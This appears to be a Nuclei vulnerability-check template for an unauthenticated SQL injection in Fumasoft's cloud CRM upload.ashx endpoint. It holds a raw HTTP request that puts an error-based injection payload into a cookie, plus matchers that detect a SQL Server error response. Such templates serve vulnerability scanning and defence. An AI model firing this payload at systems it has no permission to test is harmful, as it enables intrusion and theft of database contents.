id: fumasoft-upload-cookie-sqli
info:
  name: 孚盟云 CRM upload.ashx cookie - sqli
  author: leadlife
  severity: high
  description: 上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云upload.ashx接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/xih287upko67cnsn
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: fumasoft,sqli

http:
  - raw:
      - |
        GET /Ajax/upload.ashx?action=deletefile&name=poc HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
        X-Forwarded-For: 127.0.0.1
        Cookie: poc=1'and 1<@@version--
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains_all(body,'Microsoft SQL Server')
        condition: and